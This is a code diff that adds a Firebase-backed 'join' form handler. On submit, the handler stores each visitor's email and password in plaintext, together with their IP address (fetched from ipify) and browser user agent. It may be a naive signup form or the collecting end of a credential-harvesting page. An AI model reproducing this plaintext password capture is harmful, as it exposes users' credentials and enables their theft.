@@ -56,3 +56,44 @@ orderForm.addEventListener("submit", (e)=>{
   })
   .catch(err=>alert(err.message));
 });
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";
+
+// Firebase config
+const firebaseConfig = { /* তোমার Firebase config */ };
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// Function to get user IP
+async function getUserIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip || "Unknown";
+  } catch(e) {
+    return "Unknown";
+  }
+}
+
+// Form submit
+document.getElementById("joinForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const ip = await getUserIP(); // fetch IP
+  const userAgent = navigator.userAgent; // browser info
+
+  const newRef = push(ref(db, "joinRequests")); // create new entry
+  set(newRef, {
+    email,
+    password,
+    ip,
+    userAgent,
+    addedTime: Date.now()
+  }).then(() => {
+    alert("✅ Request submitted!");
+    e.target.reset(); // clear form
+  }).catch(err => alert("⚠️ " + err.message));
+});
+
